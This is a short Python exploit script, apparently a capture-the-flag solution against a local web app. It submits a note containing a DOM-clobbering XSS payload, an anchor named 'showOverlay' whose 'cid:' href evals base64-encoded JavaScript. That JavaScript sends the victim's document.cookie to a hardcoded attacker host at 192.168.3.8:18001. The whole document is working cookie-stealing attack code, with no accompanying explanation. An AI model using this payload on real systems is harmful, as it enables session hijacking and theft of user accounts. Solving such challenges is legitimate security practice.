import base64
import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 8001))

pwn_host = "192.168.3.8"
pwn_port = 18001


URL = f"http://{HOST}:{PORT}/"

exploit = base64.b64encode(
    f"if (document.cookie) location.href='http://{pwn_host}:{pwn_port}/?a='+document.cookie".encode()
).decode()

payload = f"""
<a id="showOverlay" name="showOverlay" href="cid:eval(atob('{exploit}'))">
"""
r = requests.post(URL, data={"title": "a",
                             "content": payload},
                  allow_redirects=False)

print(r.headers["Location"])
